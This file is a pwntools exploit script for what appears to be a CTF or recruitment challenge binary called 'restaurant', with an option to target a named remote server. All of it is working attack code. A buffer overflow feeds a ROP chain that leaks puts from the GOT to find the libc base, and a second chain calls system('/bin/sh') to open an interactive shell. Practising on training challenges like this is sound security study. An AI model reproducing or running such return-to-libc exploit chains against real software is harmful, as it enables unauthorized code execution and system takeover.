from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h", "-F" "#{pane_pid}", "-P"]
ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a, b: p.sendlineafter(a, b)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)
# gdb.attach(p)


def conn():
    if args.REMOTE:
        p = remote("recruit.osiris.cyber.nyu.edu", 6161)
    else:
        p = process("./restaurant")
    return p


p = conn()
elf = ELF("./restaurant")
# libc = ELF("./libc.so.6", checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
sla("> ", b"1")
offset = 40
ret = 0x000000000040063E
pop_rdi = 0x00000000004010A3
main = 0x400F68
fill = 0x400E4A

payload = (
    b"A" * offset
    + p64(pop_rdi)
    + p64(elf.got["puts"])
    + p64(elf.plt["puts"])
    + p64(fill)
)
gdb.attach(p)
sla("> ", payload)

p.recvuntil(b"Enjoy your " + b"A" * 40)
leak = u64(p.recv(8).ljust(8, b"\x00"))

libc.address = leak - libc.symbols["puts"]
print(p64(libc.address))

payload = (
    b"A" * offset
    + p64(ret)
    + p64(pop_rdi)
    + p64(next(libc.search(b"/bin/sh\x00")))
    + p64(libc.symbols["system"])
)
sla("> ", payload)

p.interactive()
